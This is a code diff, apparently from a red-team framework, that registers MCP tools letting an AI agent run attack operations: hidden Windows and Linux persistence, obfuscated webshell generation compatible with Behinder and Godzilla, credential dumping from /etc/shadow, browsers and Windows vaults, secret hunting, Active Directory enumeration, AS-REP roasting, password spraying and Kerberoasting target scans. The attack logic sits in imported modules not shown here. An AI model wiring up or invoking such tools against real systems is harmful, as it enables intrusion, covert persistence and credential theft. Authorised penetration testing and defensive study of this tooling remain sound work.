@@ -1102,5 +1102,396 @@ def register_redteam_tools(mcp):
 
     registered_tools.append("redteam_lateral_chain")
 
+    # ==================== 持久化工具 ====================
+
+    @mcp.tool()
+    def persistence_windows(
+        payload_path: str,
+        method: str = "registry",
+        name: str = "",
+        hidden: bool = True
+    ) -> str:
+        """Windows持久化 - 多种持久化技术
+
+        Args:
+            payload_path: Payload路径
+            method: 持久化方式 (registry/scheduled_task/service/wmi/startup/screensaver/bits)
+            name: 持久化项目名称 (不填则自动生成)
+            hidden: 是否隐藏 (默认True)
+
+        Returns:
+            JSON格式结果
+        """
+        try:
+            from core.persistence import windows_persist
+
+            result = windows_persist(
+                payload_path=payload_path,
+                method=method,
+                name=name
+            )
+
+            return json.dumps(result, indent=2, ensure_ascii=False)
+
+        except ImportError as e:
+            return json.dumps({
+                "success": False,
+                "error": f"模块导入失败: {e}",
+                "hint": "仅支持Windows平台"
+            })
+        except Exception as e:
+            return json.dumps({
+                "success": False,
+                "error": str(e)
+            })
+
+    registered_tools.append("persistence_windows")
+
+    @mcp.tool()
+    def persistence_linux(
+        command: str,
+        method: str = "crontab",
+        user: str = "",
+        hidden: bool = True
+    ) -> str:
+        """Linux持久化 - 多种持久化技术
+
+        Args:
+            command: 要持久化的命令
+            method: 持久化方式 (crontab/systemd/bashrc/profile/ssh/ld_preload/init_d/rc_local)
+            user: 目标用户 (不填则当前用户)
+            hidden: 是否隐藏 (默认True)
+
+        Returns:
+            JSON格式结果
+        """
+        try:
+            from core.persistence import LinuxPersistence
+
+            persistence = LinuxPersistence()
+
+            if method == "crontab":
+                result = persistence.crontab(command, hidden=hidden)
+            elif method == "systemd":
+                result = persistence.systemd_service(command, hidden=hidden)
+            elif method == "bashrc":
+                result = persistence.bashrc(command, user=user)
+            elif method == "profile":
+                result = persistence.profile(command, user=user)
+            elif method == "ssh":
+                # SSH需要公钥
+                return json.dumps({
+                    "success": False,
+                    "error": "SSH方式请使用persistence_ssh_key工具"
+                })
+            elif method == "init_d":
+                result = persistence.init_d(command)
+            elif method == "rc_local":
+                result = persistence.rc_local(command)
+            else:
+                return json.dumps({
+                    "success": False,
+                    "error": f"未知方法: {method}"
+                })
+
+            return json.dumps({
+                "success": result.success,
+                "method": method,
+                "details": result.details if hasattr(result, 'details') else str(result)
+            }, indent=2, ensure_ascii=False)
+
+        except Exception as e:
+            return json.dumps({
+                "success": False,
+                "error": str(e)
+            })
+
+    registered_tools.append("persistence_linux")
+
+    @mcp.tool()
+    def persistence_webshell(
+        shell_type: str = "php",
+        password: str = "",
+        obfuscation: str = "none",
+        tool_compatible: str = ""
+    ) -> str:
+        """Webshell生成 - 多种类型和兼容工具
+
+        Args:
+            shell_type: Shell类型 (php/jsp/aspx/python)
+            password: 连接密码 (不填则自动生成)
+            obfuscation: 混淆级别 (none/low/medium/high)
+            tool_compatible: 兼容工具 (behinder/godzilla)
+
+        Returns:
+            JSON格式包含Shell代码
+        """
+        try:
+            from core.persistence import WebshellGenerator, ObfuscationLevel
+
+            obf_map = {
+                "none": ObfuscationLevel.NONE,
+                "low": ObfuscationLevel.LOW,
+                "medium": ObfuscationLevel.MEDIUM,
+                "high": ObfuscationLevel.HIGH
+            }
+
+            generator = WebshellGenerator()
+
+            if tool_compatible == "behinder":
+                result = generator.behinder_shell()
+            elif tool_compatible == "godzilla":
+                result = generator.godzilla_shell(password=password)
+            elif shell_type == "php":
+                result = generator.php_shell(
+                    password=password,
+                    obfuscation=obf_map.get(obfuscation, ObfuscationLevel.NONE)
+                )
+            elif shell_type == "jsp":
+                result = generator.jsp_shell(password=password)
+            elif shell_type == "aspx":
+                result = generator.aspx_shell(password=password)
+            elif shell_type == "python":
+                result = generator.python_shell(password=password)
+            else:
+                return json.dumps({
+                    "success": False,
+                    "error": f"未知Shell类型: {shell_type}"
+                })
+
+            return json.dumps({
+                "success": True,
+                "type": result.shell_type.value if hasattr(result.shell_type, 'value') else shell_type,
+                "password": result.password,
+                "code": result.code,
+                "usage": result.usage
+            }, indent=2, ensure_ascii=False)
+
+        except Exception as e:
+            return json.dumps({
+                "success": False,
+                "error": str(e)
+            })
+
+    registered_tools.append("persistence_webshell")
+
+    # ==================== 凭证收集工具 ====================
+
+    @mcp.tool()
+    def credential_dump(
+        categories: str = "all",
+        verbose: bool = False
+    ) -> str:
+        """凭证提取 - 提取系统保存的凭证
+
+        Args:
+            categories: 提取类别 (all/wifi/vault/registry/shadow/ssh/chrome/firefox/env)
+            verbose: 是否输出详细日志
+
+        支持提取:
+            - Windows: WiFi密码, 凭据管理器, 注册表(PuTTY/WinSCP)
+            - Linux: /etc/shadow, SSH密钥
+            - 跨平台: Chrome/Firefox密码, 环境变量
+
+        Returns:
+            JSON格式凭证列表
+        """
+        try:
+            from core.credential import dump_credentials
+
+            if categories == "all":
+                cats = None
+            else:
+                cats = [c.strip() for c in categories.split(",")]
+
+            result = dump_credentials(categories=cats, verbose=verbose)
+
+            return json.dumps(result, indent=2, ensure_ascii=False)
+
+        except Exception as e:
+            return json.dumps({
+                "success": False,
+                "error": str(e)
+            })
+
+    registered_tools.append("credential_dump")
+
+    @mcp.tool()
+    def credential_find_secrets(
+        path: str,
+        recursive: bool = True,
+        include_git: bool = False
+    ) -> str:
+        """敏感信息搜索 - 搜索文件中的密码/密钥/Token
+
+        Args:
+            path: 搜索路径
+            recursive: 是否递归搜索 (默认True)
+            include_git: 是否搜索Git历史 (默认False)
+
+        搜索类型:
+            - 密码/凭证
+            - API密钥 (AWS/Google/GitHub/Stripe等)
+            - 私钥/证书
+            - 数据库连接字符串
+            - JWT Token
+            - Webhook URL
+
+        Returns:
+            JSON格式搜索结果
+        """
+        try:
+            from core.credential import find_secrets
+
+            result = find_secrets(
+                path=path,
+                recursive=recursive,
+                include_git=include_git,
+                verbose=False
+            )
+
+            return json.dumps(result, indent=2, ensure_ascii=False)
+
+        except Exception as e:
+            return json.dumps({
+                "success": False,
+                "error": str(e)
+            })
+
+    registered_tools.append("credential_find_secrets")
+
+    # ==================== AD渗透工具 ====================
+
+    @mcp.tool()
+    def ad_enumerate(
+        domain: str,
+        dc_ip: str = "",
+        username: str = "",
+        password: str = "",
+        enum_type: str = "all"
+    ) -> str:
+        """AD域枚举 - LDAP查询域信息
+
+        Args:
+            domain: 域名 (如 contoso.com)
+            dc_ip: 域控IP (不填则自动解析)
+            username: 用户名 (可选,支持匿名枚举)
+            password: 密码
+            enum_type: 枚举类型 (all/users/groups/computers/spn/gpo/trusts/domain_admins)
+
+        Returns:
+            JSON格式枚举结果
+        """
+        try:
+            from core.ad import ad_enumerate as _ad_enumerate
+
+            result = _ad_enumerate(
+                domain=domain,
+                dc_ip=dc_ip if dc_ip else None,
+                username=username,
+                password=password,
+                enum_type=enum_type,
+                verbose=False
+            )
+
+            return json.dumps(result, indent=2, ensure_ascii=False)
+
+        except Exception as e:
+            return json.dumps({
+                "success": False,
+                "error": str(e)
+            })
+
+    registered_tools.append("ad_enumerate")
+
+    @mcp.tool()
+    def ad_kerberos_attack(
+        domain: str,
+        dc_ip: str,
+        attack_type: str,
+        targets: str,
+        password: str = ""
+    ) -> str:
+        """Kerberos攻击 - AS-REP Roasting/密码喷洒/用户枚举
+
+        Args:
+            domain: 域名
+            dc_ip: 域控IP
+            attack_type: 攻击类型 (asrep/spray/enum)
+            targets: 目标列表 (逗号分隔的用户名)
+            password: 密码 (spray攻击需要)
+
+        攻击类型说明:
+            - asrep: AS-REP Roasting (获取不需预认证用户的hash)
+            - spray: 密码喷洒 (对多用户尝试同一密码)
+            - enum: 用户枚举 (通过Kerberos错误码判断用户存在)
+
+        Returns:
+            JSON格式攻击结果 (含可破解的hash)
+        """
+        try:
+            from core.ad import kerberos_attack as _kerberos_attack
+
+            target_list = [t.strip() for t in targets.split(",") if t.strip()]
+
+            result = _kerberos_attack(
+                domain=domain,
+                dc_ip=dc_ip,
+                attack_type=attack_type,
+                targets=target_list,
+                password=password,
+                verbose=False
+            )
+
+            return json.dumps(result, indent=2, ensure_ascii=False)
+
+        except Exception as e:
+            return json.dumps({
+                "success": False,
+                "error": str(e)
+            })
+
+    registered_tools.append("ad_kerberos_attack")
+
+    @mcp.tool()
+    def ad_spn_scan(
+        domain: str,
+        dc_ip: str = "",
+        username: str = "",
+        password: str = ""
+    ) -> str:
+        """SPN扫描 - 发现Kerberoasting目标
+
+        Args:
+            domain: 域名
+            dc_ip: 域控IP
+            username: 用户名 (可选)
+            password: 密码 (可选)
+
+        Returns:
+            JSON格式SPN列表 (可用于Kerberoasting)
+        """
+        try:
+            from core.ad import ad_enumerate as _ad_enumerate
+
+            result = _ad_enumerate(
+                domain=domain,
+                dc_ip=dc_ip if dc_ip else None,
+                username=username,
+                password=password,
+                enum_type="spn",
+                verbose=False
+            )
+
+            return json.dumps(result, indent=2, ensure_ascii=False)
+
+        except Exception as e:
+            return json.dumps({
+                "success": False,
+                "error": str(e)
+            })
+
+    registered_tools.append("ad_spn_scan")
+
     logger.info(f"已注册 {len(registered_tools)} 个 Red Team 工具")
     return registered_tools
